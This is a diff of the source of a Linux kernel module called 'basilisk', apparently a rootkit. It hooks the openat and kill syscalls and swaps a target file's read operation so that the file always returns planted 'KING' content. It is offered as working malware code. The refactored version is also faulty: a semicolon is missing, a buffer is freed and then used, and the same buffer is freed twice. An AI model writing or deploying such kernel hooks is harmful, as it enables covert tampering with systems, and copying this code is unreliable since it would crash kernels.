@@ -44,6 +44,11 @@ static void cleanup_new_fops(void) {
     king_fops = NULL; // prevent dangling pointer access
 }
 
+/*
+Hook for the read system call. Reads KING into buf and updates the pos pointer.
+WARNING: This function is to be hooked in the f_op struct of the target file.
+            Hooking it elsewhere will most definetely cause damage to the system.
+*/
 static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
 {
     int read_len; 
@@ -60,6 +65,90 @@ static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff
     }
 }
 
+
+/* 
+Chains kern_path and d_path to resolve the final filename from a path (filename) is pointing to. 
+WARNING: Callers should use full_path, not resolved_path, to use the name! 
+*/
+static long resolve_filename(const char __user *filename, char *resolved_path, char **full_path) {
+    char kfilename[PATH_MAX];
+    struct path path;
+    long error;
+
+    error = strncpy_from_user(kfilename, filename, PATH_MAX);
+    if (error < 0) {
+        pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
+        return error; 
+    }
+
+    error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
+    if (error) {
+        return error;
+    }
+    *full_path = d_path(&path, resolved_path, PATH_MAX);
+    if (IS_ERR(*full_path)) {
+        path_put(&path);
+        return PTR_ERR(*full_path);
+    }
+
+    path_put(&path);
+    kfree(resolved_path);
+
+    return 0;
+}
+
+/* Checks if path doesn't match KING_FILENAME or if fd is standard and return immediately */
+static long is_bad_fd(int fd, const char *full_path) {
+    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) != 0 || fd < 3) {
+        return fd;
+    }
+    return 0;
+}
+
+/* Poisons the file operations structures of given fd to use hook_read as the read syscall */
+static long handle_fops_poisoning(int fd, const char *full_path) {
+    struct file *file;
+
+    if (is_bad_fd(fd, full_path) != 0) {
+        return -1; // Signal to call orig_openat
+    }
+
+    file = fget(fd);
+    if (!file) {
+        pr_err("basilisk: failed to get file structure from file descriptor\n");
+        return -1;
+    }
+
+    /* Lazy initialization of king_fops */
+    read_lock(&king_fops_lock); 
+    if (!king_fops) {
+        read_unlock(&king_fops_lock);
+        write_lock(&king_fops_lock);
+        
+        king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
+        if (king_fops) {
+            king_fops->read = hook_read;
+        } else {
+            pr_alert("Failed to allocate memory for new file_operations\n");
+            write_unlock(&king_fops_lock);
+            return -1;
+        }
+        write_unlock(&king_fops_lock);
+
+    } else {
+        read_unlock(&king_fops_lock); // Release read lock in case of already initialized king_fops
+    }
+
+    /* *Poison* targets file fops */
+    write_lock(&king_fops_lock); 
+    file->f_op = king_fops;
+    write_unlock(&king_fops_lock);
+    
+    fput(file);
+    return fd;
+}
+
+
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_openat)(const struct pt_regs *);
 
@@ -70,174 +159,63 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
     int flags = regs->dx;
     umode_t mode = regs->r10;
 
-    struct file *file;
-    struct file_operations *king_fops;
-    struct path path;
-
+    int fd;
+    char *full_path;
     char *resolved_path;
     long error;
-
-    char kfilename[PATH_MAX];
-    char *full_path;
-    int fd;
-
-    error = strncpy_from_user(kfilename, filename, PATH_MAX);
-    if (error < 0) {
-        pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
-        return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
-    }
 
     resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
     if (!resolved_path) {
         pr_err("basilisk: kmalloc failed");
-	return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
+	    return orig_openat(regs); // Return real sys_openat without delay 
     }
-    error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
+
+    /* resolve filename from file descriptor */    
+    error = resolve_filename(filename, resolved_path, &full_path);
     if (error) {
-	pr_err("basilisk: failed to resolve path: error code %ld\n", error);
-        kfree(resolved_path);
-        return orig_openat(dfd, filename, flags, mode);
+        kfree(resolved_path) // free resolved_path
+        return orig_openat(regs);
     }
-    full_path = d_path(&path, resolved_path, PATH_MAX);
-    if (IS_ERR(full_path)) {
-        pr_err("basilisk: d_path failed: %ld\n", PTR_ERR(full_path));
-	path_put(&path);
-        kfree(resolved_path);
-        return PTR_ERR(full_path);
-    }
-
-    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
-        // Get file descriptor 
-        fd = orig_openat(dfd, filename, flags, mode);
-        if (fd == 0 || fd == 1 || fd == 2 || fd < 0) { // make sure we are not messing with STDIN, STDOUT, STDERR or some error happened
-            path_put(&path);
-            kfree(resolved_path);
-            return fd; 
-        }
-        // Get associated file struct (fget)
-        file = fget(fd);
-        if (!file) {
-            pr_err("basilisk: failed to get file structure from file descriptor\n");
-            path_put(&path);
-            kfree(resolved_path);
-            return orig_openat(dfd, filename, flags, mode); 
-        }
-
-
-        if (!king_fops) {
-	    king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
-	    if (!king_fops) {
-		fput(file);
-		path_put(&path);
-		kfree(resolved_path);
-		pr_alert("Failed to allocate memory for new file_operations\n");
-		return orig_openat(dfd, filename, flags, mode);
-	    }
-	}
-        king_fops->read = hook_read;
-        file->f_op = king_fops;
-        
-        fput(file);
-        path_put(&path);
-        kfree(resolved_path);
-
+    /* poison fops sturct if fd corresponds to our target file */
+    fd = orig_openat(regs);
+    error = handle_fops_poisoning(fd, full_path);
+    if (error == fd) { // fops poisoning succeeded 
         return fd;
-
-    } else {
-        path_put(&path);
-        kfree(resolved_path);
-        return orig_openat(dfd, filename, flags, mode);
     }
+    return orig_openat(regs);
 }
 #else
 static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
 
 static asmlinkage long hook_openat(int dfd, const char __user *filename, int flags, umode_t mode)
 {
-    struct file *file;
-    struct path path;
-
+    int fd;
+    char *full_path;
     char *resolved_path;
     long error;
 
-    char kfilename[PATH_MAX];
-    int fd;
-    char *full_path;
-    
-    error = strncpy_from_user(kfilename, filename, PATH_MAX);
-    if (error < 0) {
-        pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
-        return orig_openat(dfd, filename, flags, mode); 
-    }
-
     resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
     if (!resolved_path) {
-
-        return orig_openat(dfd, filename, flags, mode);  
+        pr_err("basilisk: kmalloc failed");
+	    return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
     }
-    error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
+
+    /* resolve filename from file descriptor */    
+    error = resolve_filename(filename, resolved_path, &full_path);
     if (error) {
-        kfree(resolved_path);
-        return error;
-    }
-    full_path = d_path(&path, resolved_path, PATH_MAX);
-    if (IS_ERR(full_path)) {
-        path_put(&path);
-        kfree(resolved_path);
-        return PTR_ERR(full_path);
-    }
-
-    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
-        fd = orig_openat(dfd, filename, flags, mode);
-        if (fd == 0 || fd == 1 || fd == 2 || fd < 0) { 
-            path_put(&path);
-            kfree(resolved_path);
-            return fd; 
-        }
-        file = fget(fd);
-        if (!file) {
-            pr_err("basilisk: failed to get file structure from file descriptor\n");
-            path_put(&path);
-            kfree(resolved_path);
-            return orig_openat(dfd, filename, flags, mode); 
-        }
-
-	    read_lock(&king_fops_lock);
-        if (!king_fops) {
-            read_unlock(&king_fops_lock);
-            write_lock(&king_fops_lock);
-            
-            king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
-            if (king_fops) {
-                king_fops->read = hook_read;
-            } else {
-                pr_alert("Failed to allocate memory for new file_operations\n");
-                write_unlocK(&king_fops_lock);
-                return fd;
-	        }
-	    }
-        read_lock(&king_fops_lock);
-        if (king_fops != file->f_op) {
-            read_unlock(&king_fops_lock);
-            write_lock(&king_fops_lock);
-            file->f_op = king_fops;
-        } else {
-            read_unlock(&king_fops_lock);
-        }
-        
-        fput(file);
-        path_put(&path);
-        kfree(resolved_path);
-
-        return fd;
-
-    } else {
-        path_put(&path);
-        kfree(resolved_path);
+        kfree(resolved_path); // free resolved_path
         return orig_openat(dfd, filename, flags, mode);
     }
+    /* poison fops sturct if fd corresponds to our target file */
+    fd = orig_openat(dfd, filename, flags, mode);
+    error = handle_fops_poisoning(fd, full_path);
+    if (error == fd) { // fops poisoning succeeded 
+        return fd;
+    }
+    return orig_openat(dfd, filename, flags, mode);
 }
 #endif
+
 /* We now have to check for the PTREGS_SYSCALL_STUBS flag and
  * declare the orig_kill and hook_kill functions differently
  * depending on the kernel version. This is the largest barrier to 
